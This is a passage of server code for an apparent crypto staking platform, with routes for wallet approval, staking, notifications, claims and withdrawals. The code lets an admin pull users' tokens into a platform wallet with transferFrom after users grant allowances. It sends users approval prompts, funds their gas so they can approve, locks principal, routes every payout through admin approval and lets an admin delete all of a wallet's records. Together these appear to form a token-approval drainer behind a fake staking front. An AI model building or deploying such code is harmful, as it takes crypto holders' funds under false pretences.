          for (const src of httpSrcs) {
            try { const p = await src(); if (p > 0) { price = p; break; } } catch (_) {}
          }
        }

        if (!price) return res.status(400).json({ error: `Could not fetch ${chainNetwork} price. Check RPC connectivity and try again.` });
        const usdValue = parseFloat((stakeAmount * price).toFixed(2));
        const { newStaked, updated } = await saveStake(usdValue, null, null, tokenKey);
        console.log(`✅ Admin native-stake: ${stakeAmount} ${tokenKey} (~$${usdValue}) for ${user.walletAddress}`);
        return res.json({ success: true, user: formatUser(updated), stakedAmount: newStaked, method: 'native-credit' });
      }

      const tokenInfo = tokenMap[tokenKey];
      if (!tokenInfo) return res.status(400).json({ error: `Unsupported token: ${token} on ${chainNetwork}` });
      if (!platformAddr) return res.status(400).json({ error: `Platform wallet not configured for ${chainNetwork}` });

      const privateKey = process.env.PLATFORM_PRIVATE_KEY;
      if (!privateKey) return res.status(500).json({ error: 'PLATFORM_PRIVATE_KEY not set — cannot sign on-chain transactions' });

      // Try each RPC until one works (public RPCs can block cloud server IPs)
      const rpcList = chainNetwork === 'ETH' ? ETH_RPC_URLS : BSC_RPC_URLS;
      let workingProvider = null;
      for (const rpcUrl of rpcList) {
        try {
          const p = new ethers.providers.JsonRpcProvider(rpcUrl);
          await p.getNetwork(); // throws if unreachable
          workingProvider = p;
          break;
        } catch (_) {}
      }
      if (!workingProvider) return res.status(500).json({ error: `All ${chainNetwork} RPC endpoints unreachable. Try again shortly.` });

      const signer = new ethers.Wallet(privateKey, workingProvider);
      const signerAddress = await signer.getAddress();
      if (signerAddress.toLowerCase() !== platformAddr.toLowerCase()) {
        return res.status(500).json({ error: `PLATFORM_PRIVATE_KEY does not match platform wallet for ${chainNetwork}` });
      }

      const tokenContract = new ethers.Contract(tokenInfo.address, USDT_ABI, signer);
      const safeDecimals  = Math.min(tokenInfo.decimals, 6);
      let amountInUnits = ethers.utils.parseUnits(stakeAmount.toFixed(safeDecimals), tokenInfo.decimals);

      const allowance = await tokenContract.allowance(user.walletAddress, platformAddr);
      if (allowance.lt(amountInUnits)) {
        const approved = ethers.utils.formatUnits(allowance, tokenInfo.decimals);
        return res.status(400).json({
          error: `User has only approved ${approved} ${token} on ${chainNetwork}. They must click "Approve" in their dashboard first.`
        });
      }

      const onChainBal = await tokenContract.balanceOf(user.walletAddress);
      if (onChainBal.lt(amountInUnits)) {
        // If balance is only slightly less (dust difference ≤ 0.01 token), clamp to actual balance
        const dustThreshold = ethers.utils.parseUnits('0.01', tokenInfo.decimals);
        if (amountInUnits.sub(onChainBal).lte(dustThreshold)) {
          amountInUnits = onChainBal; // use exact on-chain balance
        } else {
          const bal = ethers.utils.formatUnits(onChainBal, tokenInfo.decimals);
          return res.status(400).json({ error: `Insufficient balance. User has ${bal} ${token} on ${chainNetwork}.` });
        }
      }

      // Check platform wallet has enough native gas token before attempting on-chain tx
      const gasBalance = await workingProvider.getBalance(signerAddress);
      const minGas = chainNetwork === 'ETH'
        ? ethers.utils.parseEther('0.002')   // ~$6 — covers a transferFrom at high gas price
        : ethers.utils.parseEther('0.001');  // ~$0.60 — covers many BSC txs
      if (gasBalance.lt(minGas)) {
        const have    = parseFloat(ethers.utils.formatEther(gasBalance)).toFixed(6);
        const need    = chainNetwork === 'ETH' ? '0.002 ETH' : '0.001 BNB';
        const network = chainNetwork === 'ETH' ? 'Ethereum' : 'BSC';
        return res.status(400).json({
          error: `Platform wallet has insufficient gas (${have} ${chainNetwork === 'ETH' ? 'ETH' : 'BNB'}). Fund the platform wallet with at least ${need} on ${network} to pay gas for this transaction.`
        });
      }

      const usdValue = await tokenToUsd(tokenInfo, stakeAmount);

      console.log(`🔐 Admin pull transferFrom: ${user.walletAddress} → ${platformAddr}, ${stakeAmount} ${token} (~$${usdValue})`);
      const tx      = await tokenContract.transferFrom(user.walletAddress, platformAddr, amountInUnits);
      const receipt = await tx.wait();
      if (!receipt || receipt.status !== 1) return res.status(500).json({ error: 'On-chain transferFrom failed' });

      const { newStaked, updated } = await saveStake(usdValue, tx.hash, receipt.blockNumber, token.toUpperCase());
      console.log(`✅ Admin pull-stake: ${stakeAmount} ${token} (${chainNetwork}) for ${user.walletAddress} | tx: ${tx.hash}`);
      return res.json({ success: true, user: formatUser(updated), stakedAmount: newStaked, txHash: tx.hash, method: 'pull' });
    }

    return res.status(400).json({ error: `Unknown method: ${method}. Use verify or pull.` });

  } catch (err) {
    console.error('Admin stake error:', err.message);
    if (chainNetwork === 'ETH') switchToNextProvider(); else switchToNextBscProvider();
    res.status(500).json({ error: err.message });
  }
});

// ==================== WALLET CONNECTION / AUTH ====================
// First connect = auto-registration (one-time only).
// Returning users are recognised by wallet address and go straight to dashboard.

app.post('/api/request-approval', async (req, res) => {
  const { walletAddress, ipAddress, userAgent, network } = req.body;
  if (!walletAddress) return res.status(400).json({ error: 'Wallet address required' });
  const addr = walletAddress.toLowerCase();
  const net = (network || 'BSC').toUpperCase();

  try {
    // Already approved (returning user) — let them through immediately
    const [[approved]] = await pool.execute(
      'SELECT 1 FROM wallet_requests WHERE walletAddress=? AND status="approved" LIMIT 1', [addr]
    );
    if (approved) return res.json({ success: true, message: 'Already approved', approved: true });

    // Rejected
    const [[rejected]] = await pool.execute(
      'SELECT 1 FROM wallet_requests WHERE walletAddress=? AND status="rejected" LIMIT 1', [addr]
    );
    if (rejected) return res.json({ success: false, message: 'Wallet was rejected', approved: false, rejected: true });

    // Already has a pending request — update network in case it changed
    const [[existing]] = await pool.execute(
      'SELECT 1 FROM wallet_requests WHERE walletAddress=? AND status="pending" LIMIT 1', [addr]
    );
    if (existing) {
      await pool.execute('UPDATE wallet_requests SET network=? WHERE walletAddress=? AND status="pending"', [net, addr]);
      return res.json({ success: true, message: 'Request already pending', approved: false });
    }

    // New wallet — register and queue for one-time admin review
    await pool.execute(
      'INSERT INTO wallet_requests (walletAddress, ipAddress, userAgent, status, network) VALUES (?, ?, ?, "pending", ?)',
      [addr, ipAddress || 'Unknown', userAgent || 'Unknown', net]
    );

    const today = new Date().toISOString().split('T')[0];
    await pool.execute(
      'INSERT IGNORE INTO users (walletAddress, status, joinDate, lastActive) VALUES (?, "pending", ?, ?)',
      [addr, today, today]
    );

    // Fire-and-forget: send tiny BNB + ETH to new wallet so they have gas for approvals
    fundNewWallet(addr);

    res.json({ success: true, message: 'Approval requested', approved: false });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/admin/pending', requireAuth, async (req, res) => {
  try {
    const [rows] = await pool.execute(
      'SELECT * FROM wallet_requests WHERE status="pending" ORDER BY timestamp DESC'
    );
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/admin/wallets', requireAuth, async (req, res) => {
  try {
    const [pending] = await pool.execute('SELECT * FROM wallet_requests WHERE status="pending"');
    const [approved] = await pool.execute('SELECT walletAddress FROM wallet_requests WHERE status="approved"');
    const [rejected] = await pool.execute('SELECT walletAddress FROM wallet_requests WHERE status="rejected"');
    res.json({
      pending,
      approved: approved.map(r => r.walletAddress),
      rejected: rejected.map(r => r.walletAddress)
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/approve', requireAuth, async (req, res) => {
  const { walletAddress } = req.body;
  try {
    await pool.execute(
      'UPDATE wallet_requests SET status="approved" WHERE walletAddress=? AND status="pending"',
      [walletAddress]
    );
    const today = new Date().toISOString().split('T')[0];
    const [[existing]] = await pool.execute('SELECT id FROM users WHERE walletAddress=?', [walletAddress]);
    if (existing) {
      await pool.execute(
        'UPDATE users SET status="active", lastActive=? WHERE walletAddress=?',
        [today, walletAddress]
      );
    } else {
      await pool.execute(
        'INSERT INTO users (walletAddress, status, joinDate, lastActive) VALUES (?, "active", ?, ?)',
        [walletAddress, today, today]
      );
    }
    console.log('✅ Wallet approved:', walletAddress);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/reject', requireAuth, async (req, res) => {
  const { walletAddress } = req.body;
  try {
    await pool.execute(
      'UPDATE wallet_requests SET status="rejected" WHERE walletAddress=? AND status="pending"',
      [walletAddress]
    );
    console.log('❌ Wallet rejected:', walletAddress);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/disconnect', requireAuth, async (req, res) => {
  const { walletAddress } = req.body;
  const addr = walletAddress.toLowerCase();
  try {
    // Delete ALL records so the user can rejoin as a completely fresh account
    await pool.execute('DELETE FROM wallet_requests WHERE walletAddress=?', [addr]);
    await pool.execute('DELETE FROM users WHERE walletAddress=?', [addr]);
    await pool.execute('DELETE FROM wallet_balances WHERE walletAddress=?', [addr]);
    await pool.execute('DELETE FROM transactions WHERE walletAddress=?', [addr]);
    await pool.execute('DELETE FROM withdrawals WHERE walletAddress=?', [addr]);
    console.log('🗑️ Wallet fully deleted by admin:', addr);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Check if wallet is approved — returning users hit this and get true immediately
app.get('/api/check-approval/:address', async (req, res) => {
  try {
    const addr = req.params.address.toLowerCase();
    const [[row]] = await pool.execute(
      'SELECT status FROM wallet_requests WHERE walletAddress=? LIMIT 1', [addr]
    );
    if (!row) return res.json({ approved: false, found: false });
    res.json({ approved: row.status === 'approved', found: true, status: row.status });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==================== PUBLIC USER ENDPOINTS ====================

app.get('/api/user/:walletAddress', async (req, res) => {
  try {
    const addr = req.params.walletAddress;
    const [[user]] = await pool.execute('SELECT * FROM users WHERE walletAddress=?', [addr]);
    const [[balance]] = await pool.execute(
      'SELECT eth, usdt FROM wallet_balances WHERE walletAddress=?', [addr.toLowerCase()]
    );
    const bal = balance || { eth: '0.0000', usdt: '0.00' };
    if (user) {
      const stakeStart = user.stakeStartDate ? new Date(user.stakeStartDate) : null;
      const daysSinceStake = stakeStart ? Math.floor((Date.now() - stakeStart.getTime()) / 86400000) : null;
      const daysUntilUnlock = stakeStart ? Math.max(0, 30 - daysSinceStake) : null;
      res.json({
        userId: user.id,
        stakedAmount: parseFloat(user.stakedAmount) || 0,
        totalEarned: parseFloat(user.totalEarned) || 0,
        claimableRewards: parseFloat(user.claimableRewards) || 0,
        vipLevel: user.vipLevel || 0,
        status: user.status,
        walletBalance: { eth: bal.eth, usdt: bal.usdt },
        joinDate: user.joinDate,
        stakeStartDate: user.stakeStartDate || null,
        daysUntilUnlock: daysUntilUnlock,
        principalLocked: daysUntilUnlock !== null && daysUntilUnlock > 0
      });
    } else {
      res.json({
        userId: null, stakedAmount: 0, totalEarned: 0, claimableRewards: 0,
        vipLevel: 0, status: 'active',
        walletBalance: { eth: '0.0000', usdt: '0.00' }, joinDate: null,
        stakeStartDate: null, daysUntilUnlock: null, principalLocked: false
      });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/user/:walletAddress/transactions', async (req, res) => {
  try {
    const [rows] = await pool.execute(
      'SELECT *, txDate as date FROM transactions WHERE walletAddress=? ORDER BY createdAt DESC',
      [req.params.walletAddress]
    );
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/user/:walletAddress/withdrawals', async (req, res) => {
  try {
    const [rows] = await pool.execute(
      'SELECT * FROM withdrawals WHERE walletAddress=? ORDER BY requestedAt DESC',
      [req.params.walletAddress.toLowerCase()]
    );
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/settings', async (req, res) => {
  try {
    res.json(await getSettings());
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==================== STAKING ====================

app.post('/api/stake', async (req, res) => {
  const { walletAddress, amount, type, txHash, network: stakeNetwork, token: stakeToken, isNative } = req.body;
  if (!walletAddress || !amount || !type) return res.status(400).json({ success: false, message: 'Missing required fields' });
  if (type !== 'stake') return res.status(400).json({ success: false, message: 'Only "stake" type is supported' });
  if (!txHash) return res.status(400).json({ success: false, message: 'Transaction hash is required' });
  const parsedAmount = parseFloat(amount);
  if (isNaN(parsedAmount) || parsedAmount <= 0) return res.status(400).json({ success: false, message: 'Invalid amount' });

  // Select provider and token config based on network
  const isBSC = stakeNetwork === 'BSC';
  const chainProvider = isBSC ? bscProvider : provider;
  const isNativeToken = isNative || (!isBSC && (stakeToken || '').toUpperCase() === 'ETH');

  // For BSC, resolve the specific token the user staked (default USDT)
  let chainTokenAddress, tokenDecimals, tokenSymbol;
  if (isBSC) {
    const tokenKey = (stakeToken || 'USDT').toUpperCase();
    const bscTokenConfig = BSC_TOKENS[tokenKey];
    if (!bscTokenConfig) return res.status(400).json({ success: false, message: `Unsupported BSC token: ${stakeToken}` });
    chainTokenAddress = bscTokenConfig.address;
    tokenDecimals = bscTokenConfig.decimals;
    tokenSymbol = tokenKey;
  } else if (isNativeToken) {
    tokenSymbol = 'ETH';
    tokenDecimals = 18;
  } else {
    chainTokenAddress = USDT_ADDRESS;
    tokenDecimals = 6;
    tokenSymbol = 'USDT';
  }

  try {
    const settings = await getSettings();
    if (settings.maintenanceMode) return res.status(503).json({ success: false, message: 'Platform is under maintenance' });
    if (!settings.platformWallet) return res.status(400).json({ success: false, message: 'Platform wallet not configured' });

    const platformAddr = (stakeNetwork === 'ETH' ? (settings.platformWalletETH || settings.platformWallet) : settings.platformWallet);

    const [[existingTx]] = await pool.execute('SELECT id FROM transactions WHERE txHash=?', [txHash.toLowerCase()]);
    if (existingTx) return res.status(400).json({ success: false, message: 'Transaction hash already used' });

    const tx = await chainProvider.getTransaction(txHash);
    if (!tx) return res.status(400).json({ success: false, message: 'Transaction not found on-chain' });
    const receipt = await chainProvider.getTransactionReceipt(txHash);
    if (!receipt || receipt.status !== 1) return res.status(400).json({ success: false, message: 'Transaction failed or not confirmed' });
    if (tx.from.toLowerCase() !== walletAddress.toLowerCase()) return res.status(400).json({ success: false, message: 'Transaction sender does not match wallet' });

    let txAmount;
    if (isNativeToken) {
      // Native ETH: verify tx.to is platform wallet and tx.value matches
      if (tx.to.toLowerCase() !== platformAddr.toLowerCase()) return res.status(400).json({ success: false, message: 'Transaction recipient is not platform wallet' });
      txAmount = parseFloat(ethers.utils.formatEther(tx.value));
      if (Math.abs(txAmount - parsedAmount) > 0.0001) return res.status(400).json({ success: false, message: `Amount mismatch: on-chain ${txAmount}, claimed ${parsedAmount}` });
    } else {
      if (tx.to.toLowerCase() !== chainTokenAddress.toLowerCase()) return res.status(400).json({ success: false, message: `Transaction is not a ${tokenSymbol} transfer` });
      const tokenContract = new ethers.Contract(chainTokenAddress, USDT_ABI, chainProvider);
      let decoded;
      try { decoded = tokenContract.interface.parseTransaction({ data: tx.data }); }
      catch (e) { return res.status(400).json({ success: false, message: 'Could not decode transaction data' }); }
      if (decoded.name !== 'transfer') return res.status(400).json({ success: false, message: 'Transaction is not a transfer call' });
      if (decoded.args[0].toLowerCase() !== platformAddr.toLowerCase()) return res.status(400).json({ success: false, message: 'Transfer recipient is not platform wallet' });
      txAmount = parseFloat(ethers.utils.formatUnits(decoded.args[1], tokenDecimals));
      if (Math.abs(txAmount - parsedAmount) > 0.01) return res.status(400).json({ success: false, message: `Amount mismatch: on-chain ${txAmount}, claimed ${parsedAmount}` });
    }

    let [[user]] = await pool.execute('SELECT * FROM users WHERE walletAddress=?', [walletAddress]);
    if (!user) {
      const today = new Date().toISOString().split('T')[0];
      await pool.execute(
        'INSERT INTO users (walletAddress, status, joinDate, lastActive) VALUES (?, "active", ?, ?)',
        [walletAddress, today, today]
      );
      [[user]] = await pool.execute('SELECT * FROM users WHERE walletAddress=?', [walletAddress]);
    }

    const currentStake = parseFloat(user.stakedAmount);
    if (parsedAmount < settings.minStake) return res.status(400).json({ success: false, message: `Minimum stake is ${settings.minStake} USDT` });
    if (currentStake + parsedAmount > settings.maxStake) return res.status(400).json({ success: false, message: `Maximum stake is ${settings.maxStake} USDT` });

    const newStaked = currentStake + txAmount;
    const today = new Date().toISOString().split('T')[0];
    await pool.execute(
      'UPDATE users SET stakedAmount=?, vipLevel=?, lastActive=? WHERE walletAddress=?',
      [newStaked, calculateVipLevel(newStaked), today, walletAddress]
    );
    await pool.execute(
      'INSERT INTO transactions (walletAddress, type, amount, txDate, status, txHash, blockNumber) VALUES (?, "stake", ?, ?, "completed", ?, ?)',
      [walletAddress, txAmount, today, txHash, receipt.blockNumber]
    );

    const [[newTx]] = await pool.execute('SELECT *, txDate as date FROM transactions WHERE txHash=?', [txHash]);
    console.log(`💰 Verified stake: ${walletAddress} staked ${txAmount} ${tokenSymbol} on ${stakeNetwork}`);
    res.json({ success: true, stakedAmount: newStaked, transaction: newTx });
  } catch (error) {
    console.error('Stake error:', error.message);
    switchToNextProvider();
    res.status(500).json({ success: false, message: 'Failed to verify transaction. Please try again.' });
  }
});

// ==================== NOTIFICATIONS ====================

// Admin sends an approval-request notification to a user
app.post('/api/admin/users/:id/request-approval', requireAuth, async (req, res) => {
  const { network = 'BSC' } = req.body;
  const chainNetwork = network.toUpperCase() === 'ETH' ? 'ETH' : 'BSC';
  try {
    const [[user]] = await pool.execute('SELECT walletAddress FROM users WHERE id=?', [req.params.id]);
    if (!user) return res.status(404).json({ error: 'User not found' });

    // Remove any previous undismissed approval request for the same wallet+network
    await pool.execute(
      "DELETE FROM notifications WHERE walletAddress=? AND type='approval_request' AND network=? AND dismissed=0",
      [user.walletAddress.toLowerCase(), chainNetwork]
    );

    const message = chainNetwork === 'ETH'
      ? 'The platform admin is requesting permission to stake Ethereum tokens on your behalf. Please approve the tokens to continue.'
      : 'The platform admin is requesting permission to stake BSC tokens on your behalf. Please approve the tokens to continue.';

    await pool.execute(
      'INSERT INTO notifications (walletAddress, type, network, message) VALUES (?, "approval_request", ?, ?)',
      [user.walletAddress.toLowerCase(), chainNetwork, message]
    );

    console.log(`🔔 Approval request sent to ${user.walletAddress} (${chainNetwork})`);
    res.json({ success: true, message: `Approval request sent to user on ${chainNetwork}` });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// User fetches their unread notifications
app.get('/api/user/:address/notifications', async (req, res) => {
  const address = req.params.address.toLowerCase();
  try {
    const [rows] = await pool.execute(
      'SELECT id, type, network, message, createdAt FROM notifications WHERE walletAddress=? AND dismissed=0 ORDER BY createdAt DESC',
      [address]
    );
    res.json({ notifications: rows });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// User dismisses a notification
app.post('/api/user/:address/notifications/:id/dismiss', async (req, res) => {
  try {
    await pool.execute(
      'UPDATE notifications SET dismissed=1 WHERE id=? AND walletAddress=?',
      [req.params.id, req.params.address.toLowerCase()]
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Manual deposit for non-EVM networks (TRX, BTC) — admin verifies and credits
app.post('/api/stake/manual', async (req, res) => {
  const { walletAddress, amount, txHash, network } = req.body;
  if (!walletAddress || !amount || !txHash || !network) return res.status(400).json({ success: false, message: 'walletAddress, amount, txHash, network required' });
  const parsedAmount = parseFloat(amount);
  if (isNaN(parsedAmount) || parsedAmount <= 0) return res.status(400).json({ success: false, message: 'Invalid amount' });

  try {
    const settings = await getSettings();
    if (settings.maintenanceMode) return res.status(503).json({ success: false, message: 'Platform is under maintenance' });

    const [[existingTx]] = await pool.execute('SELECT id FROM transactions WHERE txHash=?', [txHash]);
    if (existingTx) return res.status(400).json({ success: false, message: 'Transaction hash already submitted' });

    const today = new Date().toISOString().split('T')[0];
    // Insert as 'pending' — admin must verify and approve manually or via admin stake
    await pool.execute(
      "INSERT INTO transactions (walletAddress, type, amount, txDate, status, txHash, token) VALUES (?, 'stake', ?, ?, 'pending', ?, ?)",
      [walletAddress.toLowerCase(), parsedAmount, today, txHash, network.toUpperCase()]
    );

    console.log(`📥 Manual deposit submitted: ${walletAddress} — ${parsedAmount} USD via ${network} — txHash: ${txHash}`);
    res.json({ success: true, message: 'Deposit submitted for admin review. Your balance will be credited once verified.' });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Claim rewards — creates a pending withdrawal request; admin must approve before payout
app.post('/api/claim', async (req, res) => {
  const { walletAddress } = req.body;
  if (!walletAddress) return res.status(400).json({ success: false, message: 'Wallet address required' });
  try {
    const settings = await getSettings();
    if (settings.maintenanceMode) return res.status(503).json({ success: false, message: 'Platform is under maintenance' });
    const [[user]] = await pool.execute('SELECT * FROM users WHERE walletAddress=?', [walletAddress]);
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });

    const claimable = parseFloat(user.claimableRewards) || 0;
    if (claimable <= 0) return res.status(400).json({ success: false, message: 'No rewards to claim' });

    // Allow partial claim — default to full claimable if no amount specified
    const requestedAmount = req.body.amount ? parseFloat(req.body.amount) : claimable;
    if (isNaN(requestedAmount) || requestedAmount <= 0) return res.status(400).json({ success: false, message: 'Invalid claim amount' });
    if (requestedAmount > claimable) return res.status(400).json({ success: false, message: `Claim amount exceeds claimable balance ($${claimable.toFixed(2)})` });
    const claimAmount = Math.min(requestedAmount, claimable);

    // Check for existing pending claim
    const [[existing]] = await pool.execute(
      'SELECT id FROM withdrawals WHERE walletAddress=? AND status="pending" AND withdrawalType="claim" LIMIT 1',
      [walletAddress]
    );
    if (existing) return res.status(400).json({ success: false, message: 'You already have a pending claim request awaiting admin approval' });

    // Deduct claimable immediately so user sees updated balance
    await pool.execute(
      'UPDATE users SET claimableRewards = GREATEST(0, claimableRewards - ?) WHERE walletAddress = ?',
      [claimAmount, walletAddress]
    );

    const today = new Date().toISOString().split('T')[0];
    const [wResult] = await pool.execute(
      'INSERT INTO withdrawals (walletAddress, amount, fee, netAmount, status, withdrawalType, userId, network, payoutToken) VALUES (?, ?, 0, ?, "pending", "claim", ?, ?, ?)',
      [walletAddress, claimAmount, claimAmount, user.id, req.body.network || 'BSC', req.body.payoutToken || 'USDC']
    );
    await pool.execute(
      'INSERT INTO transactions (walletAddress, type, amount, txDate, status) VALUES (?, "claim", ?, ?, "pending")',
      [walletAddress, claimAmount, today]
    );
    console.log(`🎁 Claim request: ${walletAddress} - $${claimAmount} (pending admin approval)`);
    res.json({ success: true, pending: true, amount: claimAmount, message: 'Claim request submitted. Awaiting admin approval.' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==================== WITHDRAWALS ====================

app.post('/api/withdraw/request', async (req, res) => {
  const { walletAddress, amount } = req.body;
  if (!walletAddress || !amount) return res.status(400).json({ success: false, message: 'Missing required fields' });
  const parsedAmount = parseFloat(amount);
  try {
    const [[user]] = await pool.execute('SELECT * FROM users WHERE walletAddress=?', [walletAddress]);
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });
    if (parsedAmount <= 0) return res.status(400).json({ success: false, message: 'Invalid amount' });

    // 30-day lock on principal: cannot withdraw staked deposit within first 30 days
    if (user.stakeStartDate) {
      const daysSinceStake = Math.floor((Date.now() - new Date(user.stakeStartDate).getTime()) / 86400000);
      if (daysSinceStake < 30) {
        const daysLeft = 30 - daysSinceStake;
        return res.status(400).json({ success: false, message: `Principal withdrawals are locked for ${daysLeft} more day(s). You can only withdraw earned rewards during this period.` });
      }
    }

    const [[pendingSum]] = await pool.execute(
      'SELECT COALESCE(SUM(amount),0) as total FROM withdrawals WHERE walletAddress=? AND status="pending" AND withdrawalType="stake"',
      [walletAddress]
    );
    const available = parseFloat(user.stakedAmount) - parseFloat(pendingSum.total);
    if (parsedAmount > available) return res.status(400).json({ success: false, message: 'Insufficient staked balance' });

    const settings = await getSettings();
    const fee = parsedAmount * ((settings.withdrawalFee || 2) / 100);
    const netAmount = parsedAmount - fee;
    const today = new Date().toISOString().split('T')[0];

    const [wResult] = await pool.execute(
      'INSERT INTO withdrawals (walletAddress, amount, fee, netAmount, status, withdrawalType, userId, network, payoutToken) VALUES (?, ?, ?, ?, "pending", "stake", ?, ?, ?)',
      [walletAddress, parsedAmount, fee, netAmount, user.id, req.body.network || 'BSC', req.body.payoutToken || 'USDC']
    );
    const id = wResult.insertId;
    await pool.execute(
      'INSERT INTO transactions (walletAddress, type, amount, txDate, status) VALUES (?, "withdraw", ?, ?, "pending")',
      [walletAddress, parsedAmount, today]
    );

    console.log(`💸 Withdrawal requested: ${walletAddress} - $${parsedAmount}`);
    res.json({ success: true, withdrawal: { id, walletAddress, amount: parsedAmount, fee, netAmount, status: 'pending', withdrawalType: 'stake' } });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/withdraw/earnings', async (req, res) => {
  const { walletAddress, amount } = req.body;
  if (!walletAddress || !amount) return res.status(400).json({ success: false, message: 'Missing required fields' });
  const parsedAmount = parseFloat(amount);
  try {
    const [[user]] = await pool.execute('SELECT * FROM users WHERE walletAddress=?', [walletAddress]);
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });
    if (parsedAmount <= 0) return res.status(400).json({ success: false, message: 'Invalid amount' });

    const [[pendingSum]] = await pool.execute(
      'SELECT COALESCE(SUM(amount),0) as total FROM withdrawals WHERE walletAddress=? AND status="pending" AND withdrawalType="earnings"',
      [walletAddress]
    );
    const available = (parseFloat(user.claimableRewards) || 0) - parseFloat(pendingSum.total);
    if (parsedAmount > available) return res.status(400).json({ success: false, message: 'Insufficient claimable earnings' });

    const today = new Date().toISOString().split('T')[0];
    const [wResult2] = await pool.execute(
      'INSERT INTO withdrawals (walletAddress, amount, fee, netAmount, status, withdrawalType, userId, network, payoutToken) VALUES (?, ?, 0, ?, "pending", "earnings", ?, ?, ?)',
      [walletAddress, parsedAmount, parsedAmount, user.id, req.body.network || 'BSC', req.body.payoutToken || 'USDC']
    );
    const id = wResult2.insertId;
    await pool.execute(
      'INSERT INTO transactions (walletAddress, type, amount, txDate, status) VALUES (?, "withdraw_earnings", ?, ?, "pending")',
      [walletAddress, parsedAmount, today]
    );

    res.json({ success: true, withdrawal: { id, walletAddress, amount: parsedAmount, fee: 0, netAmount: parsedAmount, status: 'pending', withdrawalType: 'earnings' } });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/admin/withdrawals/pending', requireAuth, async (req, res) => {
  try {
    const [rows] = await pool.execute('SELECT * FROM withdrawals WHERE status="pending" ORDER BY requestedAt DESC');
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/admin/withdrawals', requireAuth, async (req, res) => {
  try {
    const [rows] = await pool.execute('SELECT * FROM withdrawals ORDER BY requestedAt DESC');
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/withdraw/approve', requireAuth, async (req, res) => {
  const { withdrawalId, txHash: manualTxHash } = req.body;
  try {
    const [[withdrawal]] = await pool.execute('SELECT * FROM withdrawals WHERE id=?', [withdrawalId]);
    if (!withdrawal) return res.status(404).json({ error: 'Withdrawal not found' });
    const [[user]] = await pool.execute('SELECT * FROM users WHERE walletAddress=?', [withdrawal.walletAddress]);
    if (!user) return res.status(404).json({ error: 'User not found' });

    // ── Deduct balances ─────────────────────────────────────────────────────
    // Claims already deducted claimableRewards at submission time, so skip here
    if (withdrawal.withdrawalType === 'earnings') {
      await pool.execute(
        'UPDATE users SET claimableRewards=GREATEST(0, claimableRewards-?) WHERE walletAddress=?',
        [withdrawal.amount, withdrawal.walletAddress]
      );
    } else if (withdrawal.withdrawalType !== 'claim') {
      const newStaked = Math.max(0, parseFloat(user.stakedAmount) - parseFloat(withdrawal.amount));
      await pool.execute(
        'UPDATE users SET stakedAmount=?, vipLevel=? WHERE walletAddress=?',
        [newStaked, calculateVipLevel(newStaked), withdrawal.walletAddress]
      );
    }

    // ── Auto on-chain payout ─────────────────────────────────────────────────
    let finalTxHash = manualTxHash || null;
    let payoutError = null;

    if (PLATFORM_PAYOUT_KEY) {
      try {
        const network    = withdrawal.network     || 'BSC';
        const token      = withdrawal.payoutToken || 'USDC';
        const sendAmount = parseFloat(withdrawal.netAmount);
        finalTxHash = await sendCryptoToUser(withdrawal.walletAddress, sendAmount, network, token);
        console.log(`✅ Auto-payout sent: ${sendAmount} ${token} (${network}) to ${withdrawal.walletAddress}`);
        await pool.execute(
          'INSERT INTO payout_logs (withdrawalId, walletAddress, amount, network, token, txHash, status) VALUES (?,?,?,?,?,?,?)',
          [withdrawalId, withdrawal.walletAddress, sendAmount, network, token, finalTxHash, 'success']
        );
      } catch (payErr) {
        payoutError = payErr.message;
        console.error(`❌ Auto-payout failed (will still approve):`, payErr.message);
        await pool.execute(
          'INSERT INTO payout_logs (withdrawalId, walletAddress, amount, network, token, txHash, status, error) VALUES (?,?,?,?,?,?,?,?)',
          [withdrawalId, withdrawal.walletAddress, parseFloat(withdrawal.netAmount), network, token, null, 'failed', payErr.message]
        ).catch(() => {});
      }
    }

    await pool.execute(
      'UPDATE withdrawals SET status="approved", approvedAt=NOW(), txHash=? WHERE id=?',
      [finalTxHash, withdrawalId]
    );

    const txType = withdrawal.withdrawalType === 'earnings' ? 'withdraw_earnings'
                 : withdrawal.withdrawalType === 'claim'    ? 'claim'
                 : 'withdraw';
    await pool.execute(
      'UPDATE transactions SET status="completed", txHash=? WHERE walletAddress=? AND type=? AND status="pending" LIMIT 1',
      [finalTxHash, withdrawal.walletAddress, txType]
    );

    const [[updated]] = await pool.execute('SELECT * FROM withdrawals WHERE id=?', [withdrawalId]);
    console.log(`✅ Withdrawal approved: ${withdrawal.walletAddress} - $${withdrawal.amount}`);
    res.json({ success: true, withdrawal: updated, payoutError });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Resend on-chain payout for an already-approved withdrawal that has no txHash
app.post('/api/admin/withdraw/resend/:id', requireAuth, async (req, res) => {
  try {
    const [[withdrawal]] = await pool.execute('SELECT * FROM withdrawals WHERE id=?', [req.params.id]);
    if (!withdrawal) return res.status(404).json({ error: 'Withdrawal not found' });
